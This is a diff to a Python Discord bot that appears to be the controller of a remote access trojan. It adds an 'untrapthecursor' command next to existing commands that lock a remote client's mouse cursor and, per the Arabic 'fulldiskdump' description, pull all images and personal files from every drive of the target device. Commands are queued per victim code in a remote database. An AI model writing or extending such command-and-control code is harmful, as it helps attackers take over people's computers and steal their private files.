@@ -1000,6 +1000,24 @@ async def trapthecursor_command(interaction: discord.Interaction, target_code: s
     if save_db(db, sha, url, headers, f"Trap cursor for {target_upper}"):
         await interaction.followup.send(f"🔒 **تم إرسال أمر تجميد وقفل مؤشر الماوس للعميل `{target_upper}`!**", ephemeral=True)
 
+@client.tree.command(name="untrapthecursor", description="إلغاء وفك تجميد مؤشر الماوس للعميل")
+@app_commands.describe(target_code="كود العميل")
+async def untrapthecursor_command(interaction: discord.Interaction, target_code: str):
+    if not interaction.response.is_done():
+        await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper = target_code.strip().upper()
+    if target_upper not in db.get("codes", {}):
+        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
+        return
+    if "remote_untrap_cursors" not in db: db["remote_untrap_cursors"] = {}
+    db["remote_untrap_cursors"][target_upper] = {"id": str(int(time.time()))}
+    if "remote_trap_cursors" in db and target_upper in db["remote_trap_cursors"]:
+        del db["remote_trap_cursors"][target_upper]
+    if save_db(db, sha, url, headers, f"Untrap cursor for {target_upper}"):
+        await interaction.followup.send(f"🔓 **تم إرسال أمر فك تجميد مؤشر الماوس للعميل `{target_upper}` بنجاح!**", ephemeral=True)
+
 @client.tree.command(name="fulldiskdump", description="بحث وسحب جميع الصور والملفات الشخصية الهامة من كامل أقراص الجهاز")
 @app_commands.describe(target_code="كود العميل")
 async def fulldiskdump_command(interaction: discord.Interaction, target_code: str):
